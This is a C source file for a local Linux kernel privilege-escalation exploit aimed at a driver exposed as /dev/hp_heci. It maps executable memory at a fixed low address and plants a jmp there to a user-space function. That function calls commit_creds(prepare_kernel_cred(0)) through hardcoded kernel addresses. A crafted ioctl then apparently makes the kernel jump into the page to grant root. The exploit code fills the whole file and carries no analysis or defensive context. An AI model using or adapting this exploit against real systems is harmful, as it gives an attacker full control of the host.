#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "../module/dev_ioctl.h"
#define MMAP_ADDR ((void *)0x1a000)

static struct communicator comm;
/*
 * Opcode creation
 * 0xff - jmp opcode
 * 0x25 = Mod R/M byte which points to 4 bytes past the end of the command as the
 *        place to get the absolute location from.
 * As per the Intel manual, some addressing modes includes a displacment immediately
 *  following Mod R/M byte, the displacment could be 1-4 bytes (in this case it seems
 * to be 4). Also, if an instruction is followed by immediate operand then there is
 * "always" a displacment.
 */
unsigned char opcode[] = "\xff\x25\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
unsigned int v = 0;

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

void (*funptr)();

void
usermode_fun(void)
{
  commit_creds(prepare_kernel_cred(0));
}

main(int argc, char **argv)
{
  int i;
  void *mmap_addr;

  if (argc != 2) {
    printf ("\nUsage heci_communicator <register index>");
    return;
  }

  comm.index = atoi(argv[1]);

  int fd = open("/dev/hp_heci", O_RDWR);

  if (fd < 0) { 
    printf("\n Unable to open device file, /dev/hp_heci!!");
    return;
  }

  commit_creds = (_commit_creds) 0xffffffff8107efa0;
  prepare_kernel_cred = (_prepare_kernel_cred)0xffffffff8107f230 ;
  

 *( (unsigned long *)(&opcode[6])) = usermode_fun;
  

  mmap_addr = mmap(MMAP_ADDR, 4096, PROT_EXEC | PROT_READ | PROT_WRITE, 
                   MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);

 
  if (mmap_addr != MMAP_ADDR) {
    printf("\nError, mmap failed ");
    return;
  }
 
  memcpy(mmap_addr, opcode, 14);

  if (ioctl(fd, CMD_WRITE_GRP, &comm) != 0)
    printf("\n Device read failed !!");
  
  close(fd);

}
